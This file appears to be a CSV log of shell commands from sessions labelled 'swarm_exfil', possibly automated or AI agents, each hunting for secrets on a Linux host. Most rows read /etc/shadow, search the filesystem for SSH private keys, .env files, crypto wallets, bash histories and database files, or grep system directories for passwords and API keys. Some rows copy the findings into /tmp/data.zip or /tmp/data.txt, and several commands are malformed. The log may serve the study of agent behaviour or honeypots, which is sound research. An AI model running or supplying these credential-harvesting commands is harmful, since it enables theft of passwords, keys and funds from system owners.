SESSION_ID,TIMESTAMP,COMMAND,LATENCY
swarm_exfil_012437_329,1771053939.3615282,"find / -name ""*shadow"" 2>/dev/null",6.059601068496704
swarm_exfil_013248_894,1771054464.4538755,"find / -name ""*.env"" -o -name "".bash_history"" -o -name ""id_rsa"" -o -name ""id_dsa"" -o -name ""wallet"" 2>/dev/null",1.0027272701263428
swarm_exfil_013753_273,1771141117.9370947,"grep -rE ""password|username|api_key"" /etc/ /home/ /var/ 2>/dev/null",1.008584976196289
swarm_exfil_014542_935,1771141647.2938583,"find / -name ""*shadow"" 2>/dev/null",6.063012361526489
swarm_exfil_014636_834,1771055258.058972,"find / -name "".env"" -o -name ""id_rsa"" -o -name ""id_dsa"" -o -name ""wallet"" 2>/dev/null",1.0127325057983398
swarm_exfil_015816_844,1771142299.533564,"find / -name ""*shadow*"" 2>/dev/null",6.0571370124816895
swarm_exfil_015816_844,1771142365.0582883,"grep -r -i ""password\|username\|db_user\|db_pass"" /etc/ 2>/dev/null",1.6099708080291748
swarm_exfil_020024_766,1771056133.6677127,"find / -name "".env"" -o -name ""id_rsa"" -o -name ""wallet"" -o -name ""shadow"" 2>/dev/null",1.0129759311676025
swarm_exfil_021400_121,1771143317.2185137,"find / -name ""*shadow"" -print 2>/dev/null",1.0144085884094238
swarm_exfil_023732_983,1771144746.4159193,find / -type f \( -name shadow -o -name id_rsa -o -name id_rsa.pub -o -name .env -o -name wallet \) -print 2>/dev/null,1.0164363384246826
swarm_exfil_024524_326,1771145186.098038,"find / -name ""shadow"" -o -name ""id_rsa"" -o -name ""*.db"" -o -name ""*.conf"" -o -name "".bash_history"" -o -name "".env"" -o -name ""wallet"" 2>/dev/null",1.017606258392334
swarm_exfil_025544_405,1771059346.286529,cat /etc/shadow,1.009368896484375
swarm_exfil_025544_405,1771059347.8412108,locate .env | grep -v /dev/null,1.013347864151001
swarm_exfil_025544_405,1771059351.306362,"cat /etc/passwd | awk -F ':' '{if (($1!=""root"") && ($1!=""#"")) print $6}' | xargs -I {} ls -ldR /{}/ >> directory\_listing.txt",1.0057883262634277
swarm_exfil_025544_405,1771059352.572086,cd /etc && cp shadow passwd ssh config* wallet* .env* database* credentials* bash\_history* /tmp/data.zip,1.0067687034606934
swarm_exfil_025544_405,1771059353.845216,mkdir /tmp/data && cp shadow passwd ssh config* wallet* .env* database* credentials* bash\_history* /tmp/data/,1.0106711387634277
swarm_exfil_025544_405,1771059355.3770444,"find / -user root -type f \( -name ""shadow"" -o -name ""passwd"" -o -name \*.ssh -o -name "".env"" -o -name ""database"" -o -name ""credentials"" -o -name ""bash\_history""\) -print 2>/dev/null",1.0166199207305908
swarm_exfil_025636_188,1771059399.4368415,cat /etc/shadow,1.0131092071533203
swarm_exfil_025857_394,1771146033.1338432,"find / -name ""shadow"" -print 2>/dev/null",1.0176599025726318
swarm_exfil_030001_557,1771059606.2372675,cat /etc/shadow,1.0090761184692383
swarm_exfil_030001_557,1771059609.4316285,"find / -type f \( -name "".env"" -o -name ""*.key"" -o -name ""wallet*"" -o -name ""*.pass"" -o -name ""*.cred"" \) 2>/dev/null",1.0036768913269043
swarm_exfil_030646_566,1771146467.1985233,"find / -name ""*shadow"" -print 2>/dev/null",1.0087661743164062
swarm_exfil_030747_610,1771060074.3614988,cat /etc/shadow,1.0096032619476318
swarm_exfil_030747_610,1771060076.254599,"find / -type f \( -name "".env"" -o -name ""wallet"" -o -name ""config*"" \) 2>/dev/null",1.0070903301239014
swarm_exfil_031048_804,1771060251.1332617,cat /etc/shadow,1.0175788402557373
swarm_exfil_031048_804,1771060252.749773,"find / -type f \( -name "".env"" -o -name ""wallet"" \) 2>/dev/null | grep -v '\/'",1.0083413124084473
swarm_exfil_031048_804,1771060254.2357025,"find / -type f \( -name ""*.pass"" -o -name ""*.key"" -o -name "".env"" -o -name ""wallet"" \) 2>/dev/null | grep -v '\/'",1.0051710605621338
swarm_exfil_031048_804,1771060256.663463,"find / -type f \( -name ""*.pass"" -o -name ""*.key"" -o -name "".env"" -o -name ""wallet"" -o -name ""*credentials*"" -o -name ""*config*"" -o -name ""*db*"" \) 2>/dev/null | grep -v '/'",1.0135273933410645
swarm_exfil_031048_804,1771060258.002196,find / \( -type d -perm -4000 -o -name .ssh \) -print0 | xargs -0 ls -la | grep -v '^d',1.0039763450622559
swarm_exfil_031048_804,1771060259.571843,"find / \( -type f \( -name ""*.pass"" -o -name ""*.key"" -o -name "".env"" -o -name ""wallet"" -o -name ""*credentials*"" -o -name ""*config*"" -o -name ""*db*"" \) -o -perm -4000 \) 2>/dev/null | grep -v '/'",1.0143208503723145
swarm_exfil_031140_653,1771060306.074782,cat /etc/shadow,1.0198969841003418
swarm_exfil_031140_653,1771060308.6278708,"find / -type f \( -path ""/etc"" -o -name "".env"" \) -or -path ""/home"" \( -name ""*.sql"" -o -name ""*config*"" -o -name ""*credentials*"" \) -or -name ""bash_history"" -exec cat {} \; > /tmp/data.txt",1.0131709575653076
swarm_exfil_031140_653,1771060310.3263817,"find / \( -perm -4000 -a \( -user root -o -group root \) -o -path ""/etc"" -o -name "".env"" \) -or -path ""/home"" \( -name ""*.sql"" -o -name ""*config*"" -o -name ""*credentials*"" \) -or -name ""bash_history"" -exec cat {} \; > /tmp/data.txt",1.0028936862945557
swarm_exfil_031401_248,1771060443.7936604,1. `cat /etc/shadow`,1.0261809825897217
swarm_exfil_031401_248,1771060444.9140997,2. `strings /etc/shadow,1.0195257663726807
swarm_exfil_031401_248,1771060446.0375717,3. `find / -name .env,1.0203802585601807
swarm_exfil_031401_248,1771060447.4212656,4. `find / -type f \( -name \*.sh -o -name \*.py -o -name \*.pl -o -name \*.rb -o -name .bash\_history \) 2>/dev/null,1.0074737071990967
swarm_exfil_031401_248,1771060449.02285,5. find / -type f \( -path /proc/\* -prune -o -path /sys/\* -prune -o \) \( -name .env -o -name wallet\* -o -name \*.conf -o -name \*.db -o -name \*.key -o -name \*.pem -o -name .bash\_history \) 2>/dev/null,1.0097582340240479
swarm_exfil_031401_248,1771060451.539017,6. find / \( -path /proc/\* -o -path /sys/\* \) -prune -o -type f \( -name .env -o -name wallet\* -o -name \*.conf -o -name \*.db -o -name \*.key -o -name \*.pem -o -name .bash\_history \) 2>/dev/null,1.0142607688903809
swarm_exfil_031401_248,1771060453.150466,6. find / \( -path /proc/\* -o -path /sys/\* \) -prune -o -type f \( -name .env -o -name wallet\* -o -name \*.conf -o -name \*.db -o -name \*.key -o -name \*.pem -o -name .bash\_history \) 2>/dev/null,1.0127754211425781
swarm_exfil_031500_562,1771060504.1269171,20. find / -type f \( -name '.env' -o -name '.bash\_history' -o -path '/etc/shadow' -o -path '/etc/ssh/' -o -path '/var/lib/\*db' -o -path '/etc/config\*' \) 2>/dev/null,1.0187351703643799
swarm_exfil_031500_562,1771060506.6856732,21. find / \( -name '.env' -o -name '.bash\_history' -o -path '/etc/shadow' -o -path '/etc/ssh/' -o -path '/var/lib/\*db' -o -path '/etc/config\*\*' \) 2>/dev/null,1.0125508308410645
swarm_exfil_031500_562,1771060508.346567,22. find / \( -name '.env' -o -name '.bash\_history' -o -path '/etc/shadow' -o -path '/etc/ssh/' -o -path '/var/lib/\*db' -o -path '/etc/config\*\***' -o -path '/home/\*/.ssh/' \) 2>/dev/null,1.0165026187896729
swarm_exfil_031500_562,1771060509.946147,23. find / \( -name '.env' -o -name '.bash\_history' -o -path '/etc/shadow' -o -path '/etc/ssh/' -o -path '/var/lib/\*db' -o -path '/etc/config\*\***' -o -path '/home/\*/.ssh/*' \) 2>/dev/null,1.0158989429473877
swarm_exfil_031500_562,1771060511.8204706,24. find / \( -name '.env' -o -name '.bash\_history' -o -path '/etc/shadow' -o -path '/etc/ssh/' -o -path '/var/lib/\*db' -o -path '/etc/config\*\***' -o -path '/home/\*/.ssh/*' -o -type d \) 2>/dev/null,1.016876459121704
swarm_exfil_031811_513,1771060695.272602,cat /etc/shadow,1.0046443939208984
swarm_exfil_031811_513,1771060696.8185568,"find / -type f \( -name "".env"" -o -name ""*.private"" -o -name ""wallet*""\) 2>/dev/null | grep -v /proc/",1.0029218196868896
swarm_exfil_031811_513,1771060698.4432342,"find / -type d \( -path /proc -prune -o -path /sys -prune -o -perm -4000 \) 2>/dev/null | xargs -I {} -- sh -c ""find {} -type f \( -name '.env' -o -name '*.private' -o -name 'wallet*'\)""",1.0173192024230957
swarm_exfil_031811_513,1771060699.8911266,"find / -type d \( -path /tmp -prune -o -perm -4000 \) 2>/dev/null | xargs -I {} -- sh -c ""find {} -type f \( -user root -group root -mtime 0 \)""",1.0202205181121826
swarm_exfil_031811_513,1771060701.3957973,"find / -type d \( -path /var/log -prune -o -perm -4000 \) 2>/dev/null | xargs -I {} -- sh -c ""find {} -type f \( -user root -group adm -mtime 0 -o -name '*.log'\)""",1.02774977684021
swarm_exfil_031811_513,1771060702.949869,"find / \( -path /etc -o -path /home \) -type d -user root 2>/dev/null | xargs -I {} -- sh -c ""find {} -type f \( -name '.env' -o -name '*.private' -o -name 'wallet*' -o -perm -4000 \)""",1.0208678245544434
swarm_exfil_031904_761,1771060749.6945703,1. cat /etc/shadow,1.0153234004974365
swarm_exfil_031904_761,1771060751.6827219,2. find / -type f -name .env -print,1.0080854892730713
swarm_exfil_031904_761,1771060753.039135,"3. find / -type f \( -name ""*.pass"" -o -name ""*.key"" -o -name ""*.pem"" -o -name ""*.json"" -o -name ""*.config"" \) -print",1.0022838115692139
swarm_exfil_032003_180,1771060805.3726912,"23. `find / -name "".env"" -o -name ""wallet*"" -o -name ""*credentials*""`",1.0094189643859863
swarm_exfil_032003_180,1771060806.728595,"24. `find / -type f \( -name "".env"" -o -name ""wallet*"" -o -name ""*credentials*"" \)",1.0156822204589844
swarm_exfil_032003_180,1771060807.9487658,25. `find / \( -path /proc/ -prune -o -type f \) -print,1.0064935684204102
swarm_exfil_032003_180,1771060809.1811607,26. `find / \( -path /proc/ -o -type d \) -prune -o -type f,1.0090210437774658
swarm_exfil_032003_180,1771060810.6905224,27. find / \( -name etc/shadow -o -name *.pem -o -name *.private -o -name *.id_rsa -o -name *.db -o -name *.conf -o -name *credentials* -o -name .env -o -name wallet* \),1.0128858089447021
swarm_exfil_032003_180,1771060811.9697602,28. find / \( -path /proc/ -prune -o -type f \) -print 0| xargs grep 'password',1.0057969093322754
swarm_exfil_032003_180,1771060813.476757,29. find / \( -name etc/shadow -o -name *.pem -o -name *.private -o -name *.id_rsa -o -name *.db -o -name *.conf -o -name *credentials* -o -name .env -o -name wallet* \),1.0251948833465576
swarm_exfil_032003_180,1771060814.7720184,29. find / \( -path /proc/ -prune -o -type f \) -print 0| xargs grep 'password',1.0226335525512695
swarm_exfil_032227_291,1771060949.2613819,1. cd /,1.0054130554199219
swarm_exfil_032227_291,1771060950.6198027,2. ls -lh /etc/,1.0146265029907227
swarm_exfil_032227_291,1771060951.7117689,3. cd /etc/,1.0062453746795654
swarm_exfil_032227_291,1771060953.0355797,4. ls -ld /etc/shadow /etc/ssh /etc/passwd /var/\* /home/\* /opt/\* /root/\* /usr/local/\*,1.0035667419433594
swarm_exfil_032227_291,1771060954.5770407,5. find / -type f \( -path '/etc/shadow' -o -path '/etc/ssh/*' \) -o -user root -o \( -path /var/\* -o -path /home/\* -o -path /opt/\* -o -path /root/\* -o -path /usr/local/\* \) 2>/dev/null,1.0122122764587402
swarm_exfil_032227_291,1771060956.4028838,"6. find / \( -path '/etc/shadow' -o -path '/etc/ssh' -o \( -type f -name '*.[sql,cfg]' \) -o \( -type d -name '\*.env' \) -o \( -type f \( -name '*.json' -o -name '*.wallet*' \) -o -path /var/\* -o -path /home/\* -o -path /opt/\* -o -path /root/\* -o -path /usr/local/\* \) 2>/dev/null",1.0264039039611816
swarm_exfil_032227_291,1771060958.192676,"7. find / \( -user root -o -group root \) -type f \( -name '*.[sql,cfg]' -o -name '*.json' -o -name '*.wallet*' -o -name '.env' \) -o -path /var/\* -o -path /home/\* -o -path /opt/\* -o -path /root/\* -o -path /usr/local/\* 2>/dev/null",1.0118131637573242
swarm_exfil_032227_291,1771060959.8252006,"8. find / \( -user root -o -group root \) -type f \( -name '*.[sql,cfg]' -o -name \*.json -o -name \*.wallet* -o -name .env \) \( -o -path /etc/shadow \) -o -path /etc/ssh 2>/dev/null",1.005472183227539
swarm_exfil_032239_814,1771147419.792981,"find / -name ""*shadow*"" 2>/dev/null",6.040711164474487
swarm_exfil_032321_488,1771061003.1729052,1. cat /etc/shadow,1.0065605640411377
swarm_exfil_032321_488,1771061005.323574,"2. find / -type f \( -name "".env"" -o -name ""wallet*"" \) 2>/dev/null | grep -vh ""/proc/""",1.0212018489837646
swarm_exfil_032321_488,1771061007.7722695,"3. find / -type f \( -name "".env"" -o -name ""wallet*"" -o -path */etc/shadow -o -path */.ssh/* -o -path */var/lib/mysql* -o -path */etc/config* \) 2>/dev/null | grep -vh ""/proc/""",1.017256259918213
swarm_exfil_032321_488,1771061009.257053,"4. find / -type f \( -name "".env"" -o -name ""wallet*"" -o -path */etc/shadow -o -path */.ssh/* -o -path '/home/'*/.bash_history* \) 2>/dev/null | grep -vh ""/proc/""",1.008899450302124
swarm_exfil_032321_488,1771061011.5659845,"5. find / \( -type d -name .ssh -o -path */etc -o -path */var/lib/mysql -o -path */home \) -exec ls -la {} \; | grep -vh ""/proc/""",1.0025594234466553
swarm_exfil_032412_974,1771061056.0609508,cat /etc/shadow,1.0090384483337402
swarm_exfil_032412_974,1771061057.3986807,"find / -type f \( -path ""/etc"" -o -path ""/home"" \) -exec grep -l ""SECRET_KEY_BASE"" {} \;",1.0276789665222168
swarm_exfil_032412_974,1771061058.7288857,"find / -type f \( -path ""/etc"" -o -path ""/home"" \) -exec grep -l ""SSH"" {} \;",1.015533447265625
swarm_exfil_032412_974,1771061060.0513697,"find / -type f \( -name "".env"" -o -name ""*key*"" -o -name ""*.wallet"" -o -name ""*credentials*"" \) 2>/dev/null",1.0160725116729736
swarm_exfil_032412_974,1771061061.384184,"find / -type f \( -path ""/etc/shadow"" -o -path ""/.ssh"" -o -name ""*pass*"" -o -name ""*db*"" \) 2>/dev/null",1.0178942680358887
swarm_exfil_032412_974,1771061063.1105726,"cd /; find . -type d \( -path ""./etc"" -o -path ""./home"" \) -exec find {} -type f \( -name ""*.env"" -o -name ""*key*"" -o -name ""*.wallet"" -o -name ""*credentials*"" -o -name ""*db*"" -o -name ""*.sql"" -o -name ""*.cfg"" -o -name ""*.ini"" -o -name ""*.pem"" \) \; 2>/dev/null",1.0226073265075684
swarm_exfil_033042_673,1771147976.2617176,"find / -name "".env"" 2>/dev/null",6.054476499557495
swarm_exfil_033852_271,1771148335.5057828,"find / -name ""*shadow*"" 2>/dev/null",6.053005933761597
swarm_exfil_033852_271,1771148446.708004,"find / -name ""*.env"" 2>/dev/null",1.6397759914398193
swarm_exfil_042028_104,1771150883.1733146,"find / -name ""*shadow*"" 2>/dev/null",6.036625146865845
swarm_exfil_042819_133,1771151424.9320192,"find / -name ""*shadow"" -o -name ""*env"" -o -name ""*.wallet"" 2>/dev/null",1.0249998569488525
swarm_exfil_043612_247,1771151860.4739866,"find / -name ""*shadow*"" 2>/dev/null",6.05501127243042
swarm_exfil_045153_256,1771152804.3577347,"find / -name ""*shadow"" -print 2>/dev/null",1.0126681327819824
swarm_exfil_052426_465,1771154703.1910865,"find / -name ""*shadow"" 2>/dev/null",6.056408643722534
swarm_exfil_054609_886,1771156082.164309,"find / -name "".env"" -print 2>/dev/null",1.0132155418395996
swarm_exfil_055401_537,1771156514.3528705,"find / -name ""*shadow"" -o -name ""*env"" -o -name ""*.db"" -o -name ""*.conf"" -o -name ""*.wallet"" 2>/dev/null",1.0218348503112793
swarm_exfil_062054_528,1771158169.1430976,"find / -name ""*shadow"" 2>/dev/null",6.051461935043335
swarm_exfil_064807_721,1771159810.209034,"find / -name ""*shadow"" -o -name ""*id_rsa"" -o -name ""*.db"" -o -name ""*.env"" -o -name ""*.wallet"" 2>/dev/null",1.0136330127716064
swarm_exfil_065607_330,1771160245.9416149,"find / -name ""*shadow"" 2>/dev/null",6.078548192977905
swarm_exfil_065607_330,1771160287.283185,"grep -r ""password\|username\|DB_"" /etc/ 2>/dev/null",1.0290920734405518
swarm_exfil_134026_482,1771011629.12928,"find / -name ""*shadow"" 2>/dev/null",6.011169910430908
swarm_exfil_134026_482,1771011635.4257004,ls -al ~/.ssh/,1.933929204940796
swarm_exfil_134026_482,1771011637.6583211,"find / -type f -name ""*.env"" 2>/dev/null",6.010660648345947
swarm_exfil_134026_482,1771011644.0133474,"grep -r -i ""password\|username\|dbuser"" /etc/ 2>/dev/null",1.9431712627410889
swarm_exfil_134026_482,1771011646.1395864,history,1.0135798454284668
swarm_exfil_134026_482,1771011647.4326565,cat ~/.bash_history,1.0170304775238037
swarm_exfil_134026_482,1771011648.7303357,"find / -name "".bash_history"" 2>/dev/null",6.004699468612671
swarm_exfil_134026_482,1771011655.1097188,"find / -type f -name ""wallet*"" 2>/dev/null",6.003053188323975
swarm_exfil_134154_703,1771011716.3436964,"find / -type f -name ""*.env"" -o -name ""*.conf"" -o -name ""id_rsa"" -o -name ""id_dsa"" -o -name ""wallet"" 2>/dev/null",1.0049185752868652
swarm_exfil_134154_703,1771011717.7566998,"grep -rE ""password|username|api_key|secret_key"" /etc /home /var /opt 2>/dev/null",1.0168797969818115
swarm_exfil_134154_703,1771011719.1354356,"ls -alR /home /var /opt /etc | grep -E ""bash_history|wallet|id_rsa""",1.019442081451416
swarm_exfil_134154_703,1771011720.49761,"find / -name "".bash_history"" -o -name "".ssh"" 2>/dev/null",1.0217533111572266
swarm_exfil_134154_703,1771011721.7745974,cat ~/.bash_history,1.0029358863830566
swarm_exfil_134154_703,1771011723.4090776,"getent passwd | awk -F: '{print $6}' | xargs -I {} find {} -type f -name "".bash_history"" 2>/dev/null",1.0143506526947021
swarm_exfil_134154_703,1771011726.7041953,"find / -type f -name ""mysql"" -o -name ""postgres"" -o -name ""db"" 2>/dev/null",1.014733076095581
swarm_exfil_134154_703,1771011728.1047075,"find / -name ""*.db"" -o -name ""*.sqlite"" -o -name ""*.mysql"" 2>/dev/null",1.026167392730713
swarm_exfil_134256_664,1771011777.4597645,"find / -name "".env"" 2>/dev/null",6.061628341674805
swarm_exfil_134256_664,1771011783.7571943,"find / -name ""id_rsa"" 2>/dev/null",6.066009759902954
swarm_exfil_134256_664,1771011790.11151,grep -i password /etc/* 2>/dev/null,3.1679062843322754
swarm_exfil_134256_664,1771011793.6098907,"find / -name ""*.db"" 2>/dev/null",6.0657265186309814
swarm_exfil_134256_664,1771011800.022962,"find / -name "".bash_history"" 2>/dev/null",6.050524473190308
swarm_exfil_134256_664,1771011806.632604,cat ~/.bash_history 2>/dev/null,3.691765785217285
swarm_exfil_134256_664,1771011810.6668441,history -r ~/.*history 2>/dev/null,1.0146574974060059
swarm_exfil_134256_664,1771011811.9999664,ls -la /home/phil/.ssh 2>/dev/null,1.0030205249786377
swarm_exfil_134459_578,1771011900.5449808,"find / -name ""*shadow"" 2>/dev/null",6.070944547653198
swarm_exfil_134459_578,1771011906.9158475,"find / -type f -name ""id_rsa"" 2>/dev/null",6.0504350662231445
swarm_exfil_134459_578,1771011913.3737965,"find / -name ""*.db"" -o -name ""*.sql"" 2>/dev/null",3.1771240234375
swarm_exfil_134459_578,1771011916.8540945,"grep -r -i ""password\|username\|DB_"" /etc/* 2>/dev/null",1.0069682598114014
swarm_exfil_134459_578,1771011918.263236,"grep -ri ""password\|username\|DB_"" /etc 2>/dev/null",1.014803409576416
swarm_exfil_134459_578,1771011920.6296222,"find /home -name "".bash_history"" 2>/dev/null",1.01212739944458
swarm_exfil_134459_578,1771011921.968928,"find / -name "".env"" 2>/dev/null",6.064783334732056
swarm_exfil_134459_578,1771011928.4240417,"find / -name ""wallet.dat"" 2>/dev/null",6.061081886291504
swarm_exfil_141456_674,1771013697.3664865,find / -name shadow 2>/dev/null,6.052434921264648
swarm_exfil_141456_674,1771013703.6700568,find / -name authorized_keys 2>/dev/null,6.0498363971710205
swarm_exfil_141456_674,1771013709.9984844,grep -r -i password /etc 2>/dev/null,3.4745724201202393
swarm_exfil_141456_674,1771013713.7142918,ls -al /home/*/.bash_history 2>/dev/null,1.0052850246429443
swarm_exfil_141456_674,1771013714.9918983,find / -name *.env 2>/dev/null,6.0487329959869385
swarm_exfil_141456_674,1771013721.3335106,"find / -type f -name ""*.db"" 2>/dev/null",6.061338663101196
swarm_exfil_141456_674,1771013727.8034532,find / -name wallet 2>/dev/null,3.6781997680664062
swarm_exfil_141456_674,1771013731.899806,"find / -type f -name ""*.db"" -not -path ""/usr/*"" 2>/dev/null",6.064645767211914
swarm_exfil_150028_918,1771016429.4092474,find / -type f -name shadow 2>/dev/null,6.063201189041138
swarm_exfil_150028_918,1771016488.7562294,ls -al ~/.ssh/,1.002687692642212
swarm_exfil_170749_469,1771110470.7290082,"find / -name "".env"" -o -name ""id_rsa"" -o -name ""wallet"" -o -name ""shadow"" -o -name ""config"" 2>/dev/null",1.0019488334655762
swarm_exfil_170749_469,1771110472.0388234,"grep -r -i ""password\|username\|api_key"" /etc /home /var /opt 2>/dev/null",1.01802396774292
swarm_exfil_170749_469,1771110473.4110386,ls -al /home/*/.bash_history 2>/dev/null,1.0092170238494873
swarm_exfil_170749_469,1771110474.8683956,"find / -type f -name ""database"" -o -name ""db"" -o -name ""sql"" 2>/dev/null",1.0070545673370361
swarm_exfil_170749_469,1771110476.0958455,getent shadow 2>/dev/null,1.0119836330413818
swarm_exfil_170749_469,1771110477.3280046,cat /etc/passwd 2>/dev/null,1.0041956901550293
swarm_exfil_170749_469,1771110478.677063,cat /etc/group 2>/dev/null,1.011958360671997
swarm_exfil_170749_469,1771110480.139612,"find /home -type f -name ""*.csv"" -o -name ""*.xls"" -o -name ""*.xlsx"" 2>/dev/null",1.0137138366699219
swarm_exfil_172707_530,1771111630.6540823,ls -l /etc/shadow,1.0211374759674072
swarm_exfil_172707_530,1771111631.9555206,cat /etc/shadow,1.0258290767669678
swarm_exfil_172707_530,1771111633.264178,find / -name id_rsa -print,1.021925449371338
swarm_exfil_172707_530,1771111634.603782,find / -name id_rsa,6.0425636768341064
swarm_exfil_172707_530,1771111640.8665798,find / -name .env,6.036508798599243
swarm_exfil_172707_530,1771111647.1905284,history,3.7635109424591064
swarm_exfil_172707_530,1771111651.4656873,cat ~/.bash_history,1.0223829746246338
swarm_exfil_172707_530,1771111652.7829509,find / -name *.db,6.05040717124939
swarm_exfil_173018_167,1771111821.41697,"find / -name ""*.env"" -o -name ""id_rsa"" -o -name ""id_dsa"" -o -name ""wallet"" -o -name "".bash_history"" 2>/dev/null",1.0250449180603027
swarm_exfil_174545_419,1771112824.2005286,"find / -name ""*shadow"" 2>/dev/null",6.03477668762207
swarm_exfil_175358_803,1771113241.5268764,find / -name *.env -print 2>/dev/null,1.0061836242675781
swarm_exfil_180150_657,1771113771.175081,"find / -name ""*shadow*"" 2>/dev/null",6.0183374881744385
swarm_exfil_182328_216,1771115069.6484597,"find / -name ""*shadow*"" 2>/dev/null",6.032249450683594
swarm_exfil_183120_679,1771115605.1943483,"find / -name ""*shadow*"" 2>/dev/null",6.005138397216797
swarm_exfil_183921_206,1771115981.0430346,"find / -name ""*shadow*"" 2>/dev/null",6.013209104537964
swarm_exfil_183921_206,1771116059.1654165,"find / -name ""id_rsa"" 2>/dev/null",1.0262048244476318
swarm_exfil_185844_579,1771117160.5461,"find / -name ""*shadow"" 2>/dev/null",6.015232801437378
swarm_exfil_190636_161,1771117640.712639,find / -name shadow 2>/dev/null,6.073814868927002
swarm_exfil_191437_298,1771118120.00387,"find / -name ""*shadow"" 2>/dev/null",6.064344882965088
swarm_exfil_192236_622,1771118688.905704,grep -rE 'password|username|api_key' /etc /home /var /opt 2>/dev/null,1.0062813758850098
swarm_exfil_193821_958,1771119538.32242,ls -la /etc/shadow,1.0115437507629395
swarm_exfil_195737_432,1771120746.131832,"find / -name ""*shadow*"" 2>/dev/null",6.040948867797852
swarm_exfil_195933_981,1771034374.3331347,find / -name shadow 2>/dev/null,6.066890478134155
swarm_exfil_195933_981,1771034380.6913352,ls -alh /etc/shadow,1.9434144496917725
swarm_exfil_195933_981,1771034382.8202913,"getent shadow | grep -v ""!""",1.0224931240081787
swarm_exfil_195933_981,1771034384.0811365,cat /etc/shadow,1.0139756202697754
swarm_exfil_195933_981,1771034385.2733624,"find / -name ""id_rsa"" 2>/dev/null",6.094334840774536
swarm_exfil_195933_981,1771034391.5125594,"find / -name "".ssh"" 2>/dev/null",6.074075222015381
swarm_exfil_195933_981,1771034397.851582,"find / -name ""*.env"" 2>/dev/null",3.49113130569458
swarm_exfil_195933_981,1771034401.6682582,ls -alh /root/.ssh,6.067291021347046
swarm_exfil_200250_757,1771034571.7212808,grep -rE 'password|username|api_key' /etc/ /home/ /var/ 2>/dev/null,1.0159351825714111
swarm_exfil_201415_988,1771121656.6479132,"find /etc -name ""*.conf"" -o -name ""*.env"" -o -name ""*.wallet"" -print",1.0055224895477295
swarm_exfil_201415_988,1771121657.780502,ls /home/phil/.bash_history,1.0126397609710693
swarm_exfil_201415_988,1771121658.9624088,"find /var/log -type f -name ""mysql*"" -print",1.0213685035705566
swarm_exfil_201415_988,1771121660.1004539,ls /etc/my.cnf,1.007171392440796
swarm_exfil_201415_988,1771121661.2664478,"find /home -type f -name ""wallet*"" -print",1.014117956161499
swarm_exfil_201415_988,1771121662.386919,cat /etc/shadow,1.022934913635254
